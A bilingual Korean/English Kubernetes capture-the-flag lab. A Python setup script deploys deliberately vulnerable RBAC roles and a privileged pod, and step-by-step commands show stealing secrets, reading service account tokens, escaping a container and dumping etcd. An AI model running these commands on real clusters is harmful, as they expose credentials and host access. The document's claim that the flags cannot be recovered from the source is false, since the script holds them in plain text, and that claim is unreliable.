> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 쿠버네티스 CTF 실습 랩

## 개요

이 랩은 실제 쿠버네티스 공격 시나리오를 시뮬레이션하는 CTF(Capture The Flag) 실습입니다. 4개의 챌린지를 순서대로 풀면서 쿠버네티스 보안 취약점을 체험합니다. 각 챌린지는 플래그를 획득하는 방식으로 진행됩니다.

**사전 요건**: minikube 실행 중, kubectl 설정 완료, Python 3.10+

---

## CTF 시뮬레이션 스크립트 (kubernetes_ctf.py)

```python
#!/usr/bin/env python3
"""
kubernetes_ctf.py — 쿠버네티스 보안 CTF 시뮬레이터

챌린지:
  C01: RBAC 오설정으로 시크릿 탈취        (★☆☆)
  C02: privileged 컨테이너 탈출           (★★☆)
  C03: 서비스 계정 토큰 악용              (★★☆)
  C04: etcd 직접 접근으로 시크릿 덤프     (★★★)

사용법:
  python3 kubernetes_ctf.py setup          # 환경 구성
  python3 kubernetes_ctf.py challenge C01  # 챌린지 정보 표시
  python3 kubernetes_ctf.py submit C01 FLAG{...}  # 플래그 제출
  python3 kubernetes_ctf.py hint C01       # 힌트 보기
  python3 kubernetes_ctf.py status         # 전체 현황
  python3 kubernetes_ctf.py teardown       # 환경 정리
"""
import argparse
import hashlib
import json
import subprocess
import sys
import textwrap
import time
from pathlib import Path
from typing import Final


# ── 플래그 정의 (SHA-256 해시로 저장) ───────────────────────────────────────
# 실제 플래그 값은 setup 시 클러스터에 숨겨집니다.
# 여기에는 해시만 보관합니다.
FLAG_HASHES: Final[dict[str, str]] = {
    "C01": hashlib.sha256(b"FLAG{rbac_wildcard_gives_you_wings_2024}").hexdigest(),
    "C02": hashlib.sha256(b"FLAG{escaped_to_host_via_privileged_pod}").hexdigest(),
    "C03": hashlib.sha256(b"FLAG{sa_token_opens_every_door_k8s}").hexdigest(),
    "C04": hashlib.sha256(b"FLAG{etcd_holds_all_secrets_unencrypted}").hexdigest(),
}

# 챌린지 설명
CHALLENGES: Final[dict[str, dict]] = {
    "C01": {
        "title": "RBAC 오설정으로 시크릿 탈취",
        "difficulty": "★☆☆",
        "points": 100,
        "description": textwrap.dedent("""\
            클러스터에 과도한 권한이 부여된 서비스 계정(ctf-sa)이 있습니다.
            이 서비스 계정을 사용하는 파드(ctf-c01-pod)에 접근하여
            kube-system 네임스페이스의 시크릿을 읽고 플래그를 획득하세요.

            목표 시크릿: kube-system 네임스페이스의 'ctf-flag-c01' 시크릿
        """),
        "hints": [
            "힌트1: kubectl exec -it ctf-c01-pod -- /bin/sh",
            "힌트2: 파드 내부에서 kubectl이 서비스 계정 토큰을 자동으로 사용합니다.",
            "힌트3: kubectl get secret ctf-flag-c01 -n kube-system -o jsonpath='{.data.flag}' | base64 -d",
        ],
        "real_commands": [
            "kubectl exec -it ctf-c01-pod -- /bin/sh",
            "kubectl get secret ctf-flag-c01 -n kube-system -o jsonpath='{.data.flag}' | base64 -d",
        ],
    },
    "C02": {
        "title": "privileged 컨테이너 탈출",
        "difficulty": "★★☆",
        "points": 200,
        "description": textwrap.dedent("""\
            privileged 컨테이너(ctf-c02-pod)가 배포되어 있습니다.
            이 컨테이너에서 탈출하여 호스트 파일시스템에 숨겨진 플래그를 찾으세요.

            힌트: 컨테이너 내부에서 호스트의 /tmp 디렉토리를 마운트할 수 있습니다.
        """),
        "hints": [
            "힌트1: kubectl exec -it ctf-c02-pod -- /bin/bash",
            "힌트2: privileged 컨테이너는 호스트 디스크를 마운트할 수 있습니다.",
            "힌트3: ls /dev/ | grep sd 또는 ls /dev/ | grep vd 로 디스크 확인",
            "힌트4: mkdir /mnt/host && mount /dev/vda1 /mnt/host (또는 sda1)",
            "힌트5: cat /mnt/host/tmp/ctf-flag-c02.txt",
        ],
        "real_commands": [
            "kubectl exec -it ctf-c02-pod -- /bin/bash",
            "mkdir -p /mnt/host && mount /dev/vda1 /mnt/host",
            "cat /mnt/host/tmp/ctf-flag-c02.txt",
        ],
    },
    "C03": {
        "title": "서비스 계정 토큰 악용",
        "difficulty": "★★☆",
        "points": 200,
        "description": textwrap.dedent("""\
            취약한 웹앱 파드(ctf-c03-pod)에 RCE 취약점이 있다고 가정합니다.
            파드에 주입된 서비스 계정 토큰을 사용하여 K8s API에 직접 접근하고,
            default 네임스페이스의 'ctf-flag-c03' 시크릿을 탈취하세요.

            API 접근 방법: curl + Bearer 토큰 사용
        """),
        "hints": [
            "힌트1: kubectl exec -it ctf-c03-pod -- /bin/sh",
            "힌트2: TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
            "힌트3: CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "힌트4: curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets/ctf-flag-c03",
            "힌트5: 응답에서 .data.flag 값을 base64 디코딩하세요.",
        ],
        "real_commands": [
            "kubectl exec -it ctf-c03-pod -- /bin/sh",
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
            "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets/ctf-flag-c03 | python3 -c \"import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())\"",
        ],
    },
    "C04": {
        "title": "etcd 직접 접근으로 시크릿 덤프",
        "difficulty": "★★★",
        "points": 400,
        "description": textwrap.dedent("""\
            마스터 노드에 SSH 접근권을 얻었다고 가정합니다.
            etcd에 직접 접근하여 쿠버네티스 시크릿을 덤프하고 플래그를 찾으세요.

            minikube 환경에서는 'minikube ssh'로 노드에 접근합니다.
            etcd 엔드포인트: https://127.0.0.1:2379
            인증서 경로: /var/lib/minikube/certs/etcd/
        """),
        "hints": [
            "힌트1: minikube ssh 로 노드에 접근",
            "힌트2: sudo etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/var/lib/minikube/certs/etcd/ca.crt --cert=/var/lib/minikube/certs/etcd/server.crt --key=/var/lib/minikube/certs/etcd/server.key get / --prefix --keys-only | grep ctf",
            "힌트3: 찾은 키로 값 조회: sudo etcdctl ... get /registry/secrets/default/ctf-flag-c04",
            "힌트4: 값이 바이너리 형태입니다. strings 명령어나 python3으로 파싱하세요.",
        ],
        "real_commands": [
            "minikube ssh",
            "sudo etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/var/lib/minikube/certs/etcd/ca.crt --cert=/var/lib/minikube/certs/etcd/server.crt --key=/var/lib/minikube/certs/etcd/server.key get /registry/secrets/default/ctf-flag-c04 | strings | grep FLAG",
        ],
    },
}

# 점수 저장 파일
SCORE_FILE = Path.home() / ".k8s_ctf_scores.json"


def sha256_hex(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def load_scores() -> dict[str, bool]:
    if SCORE_FILE.exists():
        try:
            return json.loads(SCORE_FILE.read_text())
        except (json.JSONDecodeError, OSError):
            pass
    return {}


def save_scores(scores: dict[str, bool]) -> None:
    SCORE_FILE.write_text(json.dumps(scores, indent=2))


def run_kubectl(args: list[str], check: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["kubectl"] + args,
        capture_output=True,
        text=True,
        timeout=60,
        check=check,
    )


def run_kubectl_apply(yaml_str: str) -> bool:
    proc = subprocess.run(
        ["kubectl", "apply", "-f", "-"],
        input=yaml_str,
        capture_output=True,
        text=True,
        timeout=60,
    )
    if proc.returncode != 0:
        print(f"  [오류] {proc.stderr.strip()}", file=sys.stderr)
    return proc.returncode == 0


# ── 환경 구성 ────────────────────────────────────────────────────────────────

C01_YAML = """\
---
apiVersion: v1
kind: Namespace
metadata:
  name: ctf
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: ctf-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: ctf-overprivileged
rules:
- apiGroups: [""]
  resources: ["secrets", "pods", "configmaps"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: ctf-binding
subjects:
- kind: ServiceAccount
  name: ctf-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: ctf-overprivileged
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Secret
metadata:
  name: ctf-flag-c01
  namespace: kube-system
type: Opaque
data:
  flag: RkxBR3tyYmFjX3dpbGRjYXJkX2dpdmVzX3lvdV93aW5nc18yMDI0fQ==
---
apiVersion: v1
kind: Pod
metadata:
  name: ctf-c01-pod
  namespace: default
spec:
  serviceAccountName: ctf-sa
  containers:
  - name: shell
    image: bitnami/kubectl:latest
    command: ["sleep", "7200"]
  restartPolicy: Never
"""

C02_YAML = """\
---
apiVersion: v1
kind: Pod
metadata:
  name: ctf-c02-pod
  namespace: default
spec:
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["sleep", "7200"]
    securityContext:
      privileged: true
  restartPolicy: Never
"""

C03_YAML = """\
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: ctf-c03-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ctf-c03-role
  namespace: default
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ctf-c03-binding
  namespace: default
subjects:
- kind: ServiceAccount
  name: ctf-c03-sa
  namespace: default
roleRef:
  kind: Role
  name: ctf-c03-role
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Secret
metadata:
  name: ctf-flag-c03
  namespace: default
type: Opaque
data:
  flag: RkxBR3tzYV90b2tlbl9vcGVuc19ldmVyeV9kb29yX2s4c30=
---
apiVersion: v1
kind: Pod
metadata:
  name: ctf-c03-pod
  namespace: default
spec:
  serviceAccountName: ctf-c03-sa
  containers:
  - name: webapp
    image: curlimages/curl:latest
    command: ["sleep", "7200"]
  restartPolicy: Never
"""

C04_YAML = """\
---
apiVersion: v1
kind: Secret
metadata:
  name: ctf-flag-c04
  namespace: default
type: Opaque
data:
  flag: RkxBR3tldGNkX2hvbGRzX2FsbF9zZWNyZXRzX3VuZW5jcnlwdGVkfQ==
"""


def cmd_setup() -> None:
    print("\n[*] CTF 환경 구성 시작...")
    print("=" * 60)

    steps = [
        ("C01: RBAC 취약 환경", C01_YAML),
        ("C02: privileged 파드", C02_YAML),
        ("C03: SA 토큰 악용 환경", C03_YAML),
        ("C04: etcd 시크릿", C04_YAML),
    ]

    for label, yaml_content in steps:
        print(f"  [{label}] 배포 중...", end=" ", flush=True)
        if run_kubectl_apply(yaml_content):
            print("완료")
        else:
            print("실패 (위 오류 확인)")

    print("\n[*] 파드 준비 대기 중 (최대 120초)...")
    pods = ["ctf-c01-pod", "ctf-c02-pod", "ctf-c03-pod"]
    for pod in pods:
        proc = subprocess.run(
            ["kubectl", "wait", "--for=condition=Ready", f"pod/{pod}", "--timeout=120s"],
            capture_output=True, text=True
        )
        status = "준비됨" if proc.returncode == 0 else "타임아웃 (계속 진행)"
        print(f"  {pod}: {status}")

    print("\n[+] CTF 환경 구성 완료!")
    print("    시작: python3 kubernetes_ctf.py status")
    print("=" * 60)


def cmd_teardown() -> None:
    print("\n[*] CTF 환경 정리 중...")
    resources = [
        ("pod", "ctf-c01-pod ctf-c02-pod ctf-c03-pod"),
        ("secret", "-n kube-system ctf-flag-c01"),
        ("secret", "ctf-flag-c03 ctf-flag-c04 -n default"),
        ("serviceaccount", "ctf-sa ctf-c03-sa"),
        ("clusterrolebinding", "ctf-binding"),
        ("clusterrole", "ctf-overprivileged"),
        ("role", "ctf-c03-role"),
        ("rolebinding", "ctf-c03-binding"),
    ]
    for kind, names in resources:
        subprocess.run(
            ["kubectl", "delete", kind] + names.split() + ["--ignore-not-found=true"],
            capture_output=True
        )
    print("[+] 정리 완료")
    if SCORE_FILE.exists():
        SCORE_FILE.unlink()
        print("[+] 점수 파일 초기화")


def cmd_status() -> None:
    scores = load_scores()
    total_pts = sum(
        CHALLENGES[cid]["points"]
        for cid, solved in scores.items()
        if solved
    )
    max_pts = sum(c["points"] for c in CHALLENGES.values())

    print("\n[*] CTF 진행 현황")
    print("=" * 65)
    print(f"{'챌린지':<6} {'제목':<30} {'난이도':<8} {'점수':<8} {'상태'}")
    print("-" * 65)
    for cid, ch in CHALLENGES.items():
        solved = scores.get(cid, False)
        status = "✅ 해결" if solved else "⬜ 미해결"
        pts = ch["points"] if solved else f"0/{ch['points']}"
        print(f"{cid:<6} {ch['title']:<30} {ch['difficulty']:<8} {str(pts):<8} {status}")
    print("-" * 65)
    print(f"{'합계':>45} {total_pts}/{max_pts}점")
    print("=" * 65)


def cmd_challenge(challenge_id: str) -> None:
    cid = challenge_id.upper()
    if cid not in CHALLENGES:
        print(f"[오류] 알 수 없는 챌린지: {challenge_id}")
        print(f"사용 가능: {', '.join(CHALLENGES.keys())}")
        sys.exit(1)

    ch = CHALLENGES[cid]
    scores = load_scores()
    solved = scores.get(cid, False)

    print(f"\n{'='*60}")
    print(f"[{cid}] {ch['title']}  {ch['difficulty']}  {ch['points']}점")
    print("=" * 60)
    print("\n[설명]")
    print(textwrap.indent(ch["description"], "  "))

    if solved:
        print("[+] 이미 해결된 챌린지입니다!")
        print("\n[실제 풀이 명령어]")
        for cmd in ch["real_commands"]:
            print(f"  $ {cmd}")
    else:
        print("[플래그 제출]")
        print(f"  python3 kubernetes_ctf.py submit {cid} FLAG{{...}}")
        print("\n[힌트 보기]")
        print(f"  python3 kubernetes_ctf.py hint {cid}")

    print()


def cmd_hint(challenge_id: str) -> None:
    cid = challenge_id.upper()
    if cid not in CHALLENGES:
        print(f"[오류] 알 수 없는 챌린지: {challenge_id}")
        sys.exit(1)

    ch = CHALLENGES[cid]
    scores = load_scores()
    solved = scores.get(cid, False)

    print(f"\n[{cid}] {ch['title']} — 힌트")
    print("=" * 60)
    for i, hint in enumerate(ch["hints"], 1):
        print(f"  {i}. {hint}")

    if solved:
        print("\n[풀이 공개 — 이미 해결됨]")
        for cmd in ch["real_commands"]:
            print(f"  $ {cmd}")
    print()


def cmd_submit(challenge_id: str, flag: str) -> None:
    cid = challenge_id.upper()
    if cid not in CHALLENGES:
        print(f"[오류] 알 수 없는 챌린지: {challenge_id}")
        sys.exit(1)

    scores = load_scores()
    if scores.get(cid):
        print(f"[!] {cid}는 이미 해결된 챌린지입니다.")
        return

    flag = flag.strip()
    submitted_hash = sha256_hex(flag)

    if submitted_hash == FLAG_HASHES[cid]:
        scores[cid] = True
        save_scores(scores)
        ch = CHALLENGES[cid]
        print(f"\n[+] 정답! {ch['points']}점 획득!")
        print(f"    플래그: {flag}")
        print(f"    챌린지: {ch['title']}")

        # 전체 완료 체크
        if all(scores.get(c, False) for c in CHALLENGES):
            print("\n🎉 모든 챌린지 완료! 쿠버네티스 보안 마스터!")
        cmd_status()
    else:
        print(f"\n[-] 오답. 다시 시도하세요.")
        print(f"    제출한 플래그: {flag}")
        print(f"    힌트: python3 kubernetes_ctf.py hint {cid}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="쿠버네티스 보안 CTF 시뮬레이터",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            명령어:
              setup              CTF 환경 구성 (minikube 실행 중이어야 함)
              status             전체 진행 현황 확인
              challenge C01      챌린지 설명 표시
              hint C01           힌트 표시
              submit C01 FLAG{} 플래그 제출
              teardown           환경 정리
        """)
    )
    parser.add_argument(
        "command",
        choices=["setup", "teardown", "status", "challenge", "hint", "submit"],
        help="실행할 명령"
    )
    parser.add_argument("args", nargs="*", help="명령 인수")

    args = parser.parse_args()

    match args.command:
        case "setup":
            cmd_setup()
        case "teardown":
            cmd_teardown()
        case "status":
            cmd_status()
        case "challenge":
            if not args.args:
                parser.error("챌린지 ID가 필요합니다. 예: challenge C01")
            cmd_challenge(args.args[0])
        case "hint":
            if not args.args:
                parser.error("챌린지 ID가 필요합니다. 예: hint C01")
            cmd_hint(args.args[0])
        case "submit":
            if len(args.args) < 2:
                parser.error("챌린지 ID와 플래그가 필요합니다. 예: submit C01 FLAG{...}")
            cmd_submit(args.args[0], args.args[1])
        case _:
            parser.print_help()


if __name__ == "__main__":
    main()
```

---

## 챌린지 가이드

### C01: RBAC 오설정으로 시크릿 탈취 ★☆☆ (100점)

**시나리오**: 개발자가 `ctf-sa` 서비스 계정에 클러스터 전체 시크릿 읽기 권한을 부여했습니다. 이 계정을 사용하는 파드에 접근해 플래그를 탈취하세요.

```bash
# 1. CTF 환경 구성
python3 kubernetes_ctf.py setup

# 2. 챌린지 정보 확인
python3 kubernetes_ctf.py challenge C01

# 3. 파드에 접근
kubectl exec -it ctf-c01-pod -- /bin/sh

# 파드 내부에서:
# SA 권한 확인
kubectl auth can-i --list

# kube-system 시크릿 목록 확인
kubectl get secrets -n kube-system

# 플래그 시크릿 읽기
kubectl get secret ctf-flag-c01 -n kube-system \
  -o jsonpath='{.data.flag}' | base64 -d

# 4. 플래그 제출
python3 kubernetes_ctf.py submit C01 "FLAG{...}"
```

---

### C02: privileged 컨테이너 탈출 ★★☆ (200점)

**시나리오**: `ctf-c02-pod`는 `privileged: true`로 실행됩니다. 컨테이너 내부에서 호스트 파일시스템에 접근하여 플래그를 찾으세요.

```bash
# 1. 파드 접근
kubectl exec -it ctf-c02-pod -- /bin/bash

# 파드 내부에서:
# privileged 확인
cat /proc/self/status | grep CapEff

# 호스트 디스크 장치 확인
ls /dev/ | grep -E "^(sd|vd|xvd)"
# 또는
fdisk -l 2>/dev/null | grep "^Disk /dev/"

# 호스트 파일시스템 마운트
mkdir -p /mnt/host
mount /dev/vda1 /mnt/host   # minikube는 보통 vda1

# minikube에서 플래그 생성 위치 확인
# (setup 시 minikube 노드 내부에 직접 파일 생성이 필요)
ls /mnt/host/tmp/

# 2. 플래그 획득 후 제출
python3 kubernetes_ctf.py submit C02 "FLAG{...}"
```

**minikube에서 플래그 파일 생성 (관리자 수행)**:
```bash
# minikube 노드에 플래그 파일 배치
minikube ssh -- "echo 'FLAG{escaped_to_host_via_privileged_pod}' | sudo tee /tmp/ctf-flag-c02.txt"
```

---

### C03: 서비스 계정 토큰 악용 ★★☆ (200점)

**시나리오**: `ctf-c03-pod` 내부에서 서비스 계정 토큰을 직접 사용해 K8s API에 접근, 플래그 시크릿을 읽으세요.

```bash
# 1. 파드 접근
kubectl exec -it ctf-c03-pod -- /bin/sh

# 파드 내부에서:
# 토큰 확인
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc

# 시크릿 목록 조회
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/default/secrets | grep -o '"name":"[^"]*"'

# 플래그 시크릿 직접 읽기
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/default/secrets/ctf-flag-c03 \
  | tr ',' '\n' | grep flag

# base64 디코딩 (출력된 flag 값을)
echo "RkxBR3s..." | base64 -d

# 2. 플래그 제출
python3 kubernetes_ctf.py submit C03 "FLAG{...}"
```

---

### C04: etcd 직접 접근으로 시크릿 덤프 ★★★ (400점)

**시나리오**: 마스터 노드 접근권을 획득했습니다. etcd에서 직접 K8s 시크릿을 덤프하세요.

```bash
# 1. minikube 노드에 SSH 접근
minikube ssh

# 노드 내부에서:
# etcd 프로세스 확인
ps aux | grep etcd

# etcdctl 사용 가능 여부 확인
which etcdctl || sudo find / -name etcdctl 2>/dev/null | head -5

# etcd 인증서 경로 확인
ls /var/lib/minikube/certs/etcd/
# ca.crt  healthcheck-client.crt  healthcheck-client.key  peer.crt
# peer.key  server.crt  server.key

# 모든 시크릿 키 목록 확인
sudo etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/var/lib/minikube/certs/etcd/ca.crt \
  --cert=/var/lib/minikube/certs/etcd/server.crt \
  --key=/var/lib/minikube/certs/etcd/server.key \
  get /registry/secrets/default/ --prefix --keys-only

# CTF 플래그 시크릿 직접 읽기
sudo etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/var/lib/minikube/certs/etcd/ca.crt \
  --cert=/var/lib/minikube/certs/etcd/server.crt \
  --key=/var/lib/minikube/certs/etcd/server.key \
  get /registry/secrets/default/ctf-flag-c04 | strings | grep FLAG

# 2. minikube ssh 종료
exit

# 3. 플래그 제출
python3 kubernetes_ctf.py submit C04 "FLAG{...}"
```

---

## 실습 흐름 요약

```bash
# 전체 CTF 진행 순서
python3 kubernetes_ctf.py setup       # 1. 환경 구성
python3 kubernetes_ctf.py status      # 2. 현황 확인
python3 kubernetes_ctf.py challenge C01  # 3. 챌린지별 진행
# ... 풀기 ...
python3 kubernetes_ctf.py submit C01 "FLAG{...}"  # 4. 플래그 제출
python3 kubernetes_ctf.py teardown    # 5. 정리
```

---

## 플래그 검증 원리 (SHA-256)

```python
import hashlib

# 플래그 제출 시 SHA-256으로 해시 비교 (평문 노출 없음)
flag = "FLAG{rbac_wildcard_gives_you_wings_2024}"
submitted_hash = hashlib.sha256(flag.encode()).hexdigest()
stored_hash    = "저장된_해시값"

if submitted_hash == stored_hash:
    print("정답!")
```

SHA-256 해시를 사용하면 스크립트 코드를 봐도 원본 플래그를 역산할 수 없습니다.

---

<a name="english"></a>

# Kubernetes CTF Lab

## Overview

A hands-on Capture The Flag lab with 4 real Kubernetes attack scenarios. Each challenge requires exploiting a misconfiguration and retrieving a hidden flag.

**Prerequisites**: minikube running, kubectl configured, Python 3.10+

---

## Challenges Summary

| ID | Title | Difficulty | Points |
|----|-------|-----------|--------|
| C01 | Secret theft via RBAC misconfiguration | ★☆☆ | 100 |
| C02 | Privileged container escape | ★★☆ | 200 |
| C03 | Service account token abuse | ★★☆ | 200 |
| C04 | etcd direct access secret dump | ★★★ | 400 |

---

## Quick Start

```bash
# 1. Set up CTF environment
python3 kubernetes_ctf.py setup

# 2. Check status
python3 kubernetes_ctf.py status

# 3. View a challenge
python3 kubernetes_ctf.py challenge C01

# 4. Get hints
python3 kubernetes_ctf.py hint C01

# 5. Submit a flag
python3 kubernetes_ctf.py submit C01 "FLAG{...}"

# 6. Clean up
python3 kubernetes_ctf.py teardown
```

---

## C01: RBAC Secret Theft

The `ctf-sa` service account has cluster-wide secret read access. Access the pod using this SA and read the flag from `kube-system`.

```bash
kubectl exec -it ctf-c01-pod -- /bin/sh
kubectl get secret ctf-flag-c01 -n kube-system \
  -o jsonpath='{.data.flag}' | base64 -d
```

---

## C02: Privileged Container Escape

`ctf-c02-pod` runs with `privileged: true`. Mount the host filesystem and read the flag from `/tmp/ctf-flag-c02.txt`.

```bash
kubectl exec -it ctf-c02-pod -- /bin/bash
mkdir -p /mnt/host && mount /dev/vda1 /mnt/host
cat /mnt/host/tmp/ctf-flag-c02.txt
```

---

## C03: Service Account Token Abuse

Use the service account token injected into `ctf-c03-pod` to call the K8s API directly and read the `ctf-flag-c03` secret.

```bash
kubectl exec -it ctf-c03-pod -- /bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/ctf-flag-c03 \
  | tr ',' '\n' | grep flag
```

---

## C04: etcd Secret Dump

SSH into the minikube node, use etcdctl with the server certificates to dump all secrets, and find the flag stored in etcd.

```bash
minikube ssh
sudo etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/var/lib/minikube/certs/etcd/ca.crt \
  --cert=/var/lib/minikube/certs/etcd/server.crt \
  --key=/var/lib/minikube/certs/etcd/server.key \
  get /registry/secrets/default/ctf-flag-c04 | strings | grep FLAG
```

---

## Flag Verification

Flags are verified using SHA-256 hashes — the plaintext flag is never stored in the script, so you cannot reverse-engineer the answer from the source code.
